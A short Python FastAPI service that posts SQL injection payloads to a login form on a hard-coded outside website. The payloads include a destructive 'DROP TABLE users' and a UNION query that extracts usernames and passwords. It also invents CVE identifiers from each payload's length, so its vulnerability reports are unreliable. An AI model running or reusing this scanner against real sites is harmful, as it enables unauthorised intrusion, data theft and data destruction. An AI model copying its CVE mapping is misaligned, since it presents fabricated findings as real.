from fastapi import FastAPI, HTTPException
from concurrent.futures import ThreadPoolExecutor
import requests
import json

app = FastAPI()

def fetch_cve_details(cve_id):
    base_url = "https://services.nvd.nist.gov/rest/json/cve/1.0/"
    api_url = f"{base_url}{cve_id}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            cve_data = response.json()
            return cve_data
        else:
            return None
    except requests.RequestException as e:
        raise HTTPException(status_code=500, detail=f"Error fetching CVE details: {e}")

def check_sql_injection(payload, url):
    data = {"username": f"admin{payload}", "password": "password"}
    try:
        response = requests.post(url, data=data)
        if "Welcome, admin!" in response.text or "SQL syntax error" in response.text or "Unknown column" in response.text:
            cve_id = f"CVE-2019-{len(payload)}"
            cve_details = fetch_cve_details(cve_id)
            if cve_details:
                return {"payload": payload, "cve_details": cve_details}
            else:
                return {"payload": payload, "cve_details": None}
        else:
            return None
    except requests.RequestException as e:
        raise HTTPException(status_code=500, detail=f"Error checking SQL injection: {e}")

@app.post("/scan/sql-injection/")
async def scan_sql_injection():
    target_url = "https://www.voltsec-io.com/"
    payloads = [
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "UNION SELECT username, password FROM users; --",
    ]
    with ThreadPoolExecutor() as executor:
        results = list(executor.map(lambda p: check_sql_injection(p, target_url), payloads))
    return {"results": results}
